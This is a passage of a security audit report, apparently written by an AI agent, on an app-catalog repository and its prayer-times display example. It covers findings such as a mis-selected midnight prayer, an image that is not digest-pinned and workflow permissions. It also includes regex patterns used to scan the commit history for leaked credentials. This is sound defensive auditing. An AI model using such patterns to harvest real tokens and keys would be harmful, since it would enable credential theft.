the standard approach. Sub-minute change at mid-latitudes; larger and more correct at high latitudes.

---

### APPS-017 — Midnight-crossing Isha mis-selects the next prayer · **Low** · Confirmed

**Where:** [`examples/…/src/js/app.js:128-156`](../../examples/prayer-times-display/src/js/app.js#L128-L156)

`prayerTimes()` returns raw decimal hours that may exceed 24 (Isha after local midnight, common far west in a
timezone or at high latitude) or go negative. `formatClockTime` normalises for *display*, but `findActiveAndNext`
compares the un-normalised values against `nowHours` (0–24). Just after local midnight the day key rolls over, the
table is recomputed, and the new `isha ≈ 24.3` still tests `> nowHours`, so the board announces "Next: Isha" for a
time that passed twenty minutes earlier.

**Fix.** Normalise to a monotonic same-day timeline before comparison, and carry yesterday's Isha so the post-midnight
window resolves to the correct active prayer.

---

### APPS-018 — Prayer grid rebuilt every second · **Low** · Confirmed

**Where:** [`examples/…/src/js/app.js:77-99`](../../examples/prayer-times-display/src/js/app.js#L77-L99), driven by
`setInterval(tick, 1000)` at `:198`

`renderCards()` does `grid.innerHTML = ''`, then six `createElement` plus six `innerHTML` assignments — a full parse,
layout and paint of the entire grid, **86,400 times a day**, forever, on a Raspberry Pi driving a TV. Only the
countdown text actually changes each second. The audit brief's low-power-hardware concern, on the exact hardware
`CLAUDE.md` §11 targets.

**Fix.** Build the six cards once; per tick only update `textContent` and toggle the two state classes. No visual
change.

---

### APPS-019 — `parking-attendant` image is not digest-pinned · **Low** · Confirmed · **Deferred**

**Where:** [`registry.yaml:50-53`](../../registry.yaml#L50-L53). The build says so itself:

```
⚠ parking-attendant: image "ghcr.io/sybutter/openmasjidparkingattendant:0.2.1" is not digest-pinned —
  a moved tag could repoint it to a backdoored image.
```

The only third-party entry (`SyButter/…`) is the only one not meeting the digest-pinning control the repo documents.
Its registry `commit:` pin is correct, so the *compose* is immutable — but the image tag that compose names is not, so
the owner (or anyone who compromises that GHCR account) can repoint `:0.2.1` at a different image and every masjid
pulls it on next install or recreate.

**Deferred deliberately, not overlooked.** Fixing it means either editing `registry.yaml` — which triggers the
production rebuild-and-publish path this audit is forbidden to fire — or asking the third-party author to digest-pin
their own compose. It is in `ACTION_REQUIRED.md` with the resolved digest for you to apply.

---

### APPS-020 — No tests, lint, or type checking · **Info** · Confirmed

`package.json` has exactly one script (`build`). There is no test runner, no linter, no type checker, and no CI job
that runs any — `.github/workflows/` contains only the catalog build and the CLA bot. `scripts/validate-compose.mjs`
is described in `CLAUDE.md` §10 as "the catalog's safety gate" with a **DO-NOT-REGRESS** invariant, and it has zero
tests; the sweep that invariant records was verified by hand.

This is also what made this audit's ship gate unmeetable as written: there was no test suite to keep green.

**Fix.** A `node:test` suite (built in, zero new dependencies): 60 cases over `validateCompose` covering every
directive class including all new rules and a regression test per finding, plus prayer-engine tests pinning the
high-latitude behaviour and known-good times. `npm test` and `npm run lint` (a `node --check` pass over every script)
wired into `build-catalog.yml` as a gate that must pass **before** the catalog is published.

---

### APPS-021 — Secrets: clean · **Info** · Confirmed · No action

All **475 commits** on all branches, content-scanned (`git log --all -p -G`) for 18 credential patterns: AWS access
keys, GitHub PAT/OAuth/fine-grained tokens, Stripe live/test/restricted keys and webhook secrets, Slack tokens, PEM
private keys and certificates, Google API keys, JWTs, SendGrid keys, npm tokens, and Postgres/MySQL/MongoDB
connection strings with embedded passwords.

```
clean: AKIA[0-9A-Z]{16}            clean: sk_live_…    clean: BEGIN … PRIVATE KEY
clean: ghp_…  gho_…  github_pat_…  clean: whsec_…      clean: postgres(ql)?://user:pass@
clean: AIza…  eyJhbGciOi…  SG\.…   clean: xox[baprs]-… clean: npm_…   (18/18 clean)
```

**No hits.** No `.env`, certificate, backup or database dump has ever been committed — the full historical file list
was enumerated and reviewed. The one file-level note is `signatures/version1/cla.json` (contributor GitHub usernames
and IDs), which is correctly on the `cla-signatures` branch and not on `main`, and contains only already-public
identifiers.

Nothing to rotate as a result of this audit. `CATALOG_PUSH_TOKEN` and `PERSONAL_ACCESS_TOKEN` are referenced correctly
as secrets and never echoed; because the former bypasses branch protection, it is listed in `ACTION_REQUIRED.md` as
the top rotation priority *if* it is ever suspected — not because anything here leaked it.

---

### APPS-022 — `cla.yml` `pull_request_target` + `actions: write` · **Info** · Accepted

[`.github/workflows/cla.yml:25-36`](../../.github/workflows/cla.yml#L25-L36) runs on `pull_request_target` and on
`issue_comment` — any comment by anyone — with `actions: write`, `contents: write`, `pull-requests: write` and
`statuses: write`.

Assessed and **accepted as-is.** The dangerous pattern is `pull_request_target` that *checks out and executes PR
code*; this workflow has no `checkout` step and runs exactly one action, pinned to a full SHA
(`contributor-assistant/github-action@ca4a40a7…`). The `if:` gate restricts comment handling to two literal strings.
`actions: write` is required by the official setup to re-run the check after signing, and the header documents why.
Untrusted input reaches a pinned third-party action, not this repo's code.

Residual risk, recorded not fixed: the permissions are broad enough that a future compromise of that action would be
serious, and the elevated `PERSONAL_ACCESS_TOKEN` is passed when set. Consider Dependabot on
`.github/workflows/**` so the pin is maintained rather than frozen.

---

### APPS-023 — Image template re-pushes the same version tag, and `:latest` · **Low** · Confirmed

**Where:** [`examples/…/build-image.yml:18-20,58-60`](../../examples/prayer-times-display/.github/workflows/build-image.yml#L18-L20)

The template triggers on `push: branches: [main]` and pushes `ghcr.io/<owner>/<repo>:<version-from-manifest>` plus
`:latest`. Since the version is read from `manifest.yaml`, **every commit to `main` overwrites the existing version
tag with different content** — the template manufactures exactly the moved-tag condition the rest of the repo warns
about at length (`CLAUDE.md` §10, `registry.yaml`'s header, and the build's own ⚠ output). An app pinned by tag
silently changes underneath the catalog; only digest-pinned entries are protected.

**Fix.** Build on `main` but **push only on `v*` tags**; drop `:latest`; and print the resulting image digest at the
end of the run so the author can paste `@sha256:…` into their compose, which is what the docs ask them to do.

---

## Coverage and gaps

**Assessed in full:** all 38 tracked files; all 475 commits of history (content-scanned, not just filenames); both
workflows; the registry and the generated catalog; `build-catalog.mjs` and `validate-compose.mjs` line by line; both
example apps including the four recovered files each; the prayer engine's astronomy checked term by term against the
USNO low-precision method; `npm audit` and the dependency tree; every documentation file for claims that contradict
the code. Compose findings were adjudicated against real Docker Compose v5.3.1, not assumed.

**Checked and found clean — stated so it is not mistaken for an omission:**

- **Secrets** — 18 patterns × 475 commits, no hits (APPS-021).
- **Dependency vulnerabilities** — `npm audit`: `found 0 vulnerabilities`. One dependency (`yaml@2.9.0`),
  lockfile-pinned with an integrity hash, actively maintained, no install scripts. No CVE identifiers are cited
  anywhere in this report because none applies; nothing has been invented.
- **XSS in the examples** — all masjid-controlled strings (`masjidName`, slide titles and bodies, `footerNote`) go
  through `textContent`. The one `innerHTML` use (`renderCards`) interpolates only hardcoded labels and numbers. No
  `eval`, no `dangerouslySetInnerHTML`, no `document.write`, no inline handlers, no remote script or font origins.
- **Shell injection in the entrypoints** — `esc()` escapes backslashes and quotes and strips CR/LF, and values enter
  via `$(…)` command substitution whose *result* the shell does not re-expand, so the unquoted heredoc is safe.
- **YAML deserialisation** — `yaml@2.9.0` constructs no arbitrary objects; an alias bomb is caught by its own
  `maxAliasCount` and degrades to the raw-regex path, which still rejects `privileged` (verified).
- **No RCE path in the build** — fetched content is parsed, never evaluated; no `child_process`, no dynamic
  `import()` of remote data, no prototype-pollution sink (fetched objects are read field-by-field, never merged).
- **Compose checks that do work** — Docker socket (including `/run/docker.sock` and `/var/run` parent mounts),
  `privileged` in all five truthy spellings, host/container `network_mode`/`pid`/`ipc`, `userns_mode`/`cgroup`/`uts:
  host`, `devices`, `device_cgroup_rules`, `volumes_from`, `env_file` escapes, `extends`/`include`, `build:`, YAML
  merge keys, sensitive-root and `..` bind mounts, external and renamed volumes, and file-based `secrets`/`configs`
  pointing outside the app folder. This is a well-built gate; the findings are its edges.
- **Not applicable, absent by design** — there is no SQL, no ORM, no HTTP server, no session or token handling, no
  password storage, no CSRF or CORS surface, no file upload, no archive extraction, no cryptography, and no SSRF sink
  beyond the two fixed `raw.githubusercontent.com`/`api.github.com` hosts. Phases 2, 4 and 7 of the brief are largely
  vacuous *for this repository* and I have not manufactured findings to fill them.
- **Mobile/client concerns from the addendum** — assessed against what exists. These are nginx-served static web
  apps, not native mobile apps: there is no WebView, no `addJavascriptInterface`, no deep link or URL scheme, no
  exported component, no OS backup surface, no third-party SDK, and no permission manifest. **No secret or API key is
  present in either shipped bundle** — every `OMOS_CONFIG` value is non-sensitive display configuration. The template
  does, however, expose *every* setting to the browser, so an author who adds an API-key setting leaks it; that is now
  documented in the template.

**Could not assess without runtime or cross-repo access — stated as unverified rather than guessed:**

1. **What is reachable on an `omos_*` Docker network** (APPS-002) — the validator gap and compose validity are
   confirmed; the blast radius depends on OpenMasjidOS internals I cannot see. The reject is correct either way.
2. **How the platform reacts to a duplicate `com.docker.compose.project` label** (APPS-004) — the rule is confirmed
   unenforced here; the consequence needs platform verification.
3. **Whether the platform's Markdown renderer sanitises `description`** (APPS-014) — determines whether hostile
   manifest Markdown is cosmetic or XSS in the dashboard.
4. **Whether the platform's `.env` writer quotes values** (APPS-014) — determines whether a newline in
   `settings[].default` is a real injection.
5. **Live drift between this validator and the platform's `apps/compose-validate.ts`** — `CLAUDE.md` §10 requires
   lockstep and I could only verify one side. A shared fixture suite is the durable answer.
6. **Whether `CATALOG_PUSH_TOKEN` is scoped as narrowly as its comment claims** — repository secrets are not readable.
7. **Runtime behaviour on real hardware** — no Raspberry Pi or OpenMasjidOS instance was available, so APPS-018 is
   reasoned from the code path, and the restored examples were verified by static review and build, not by rendering
   on a TV.

All items 1–4 have their platform-side counterpart written up in `ACTION_REQUIRED.md` under "Cross-repo", per Tier 3.
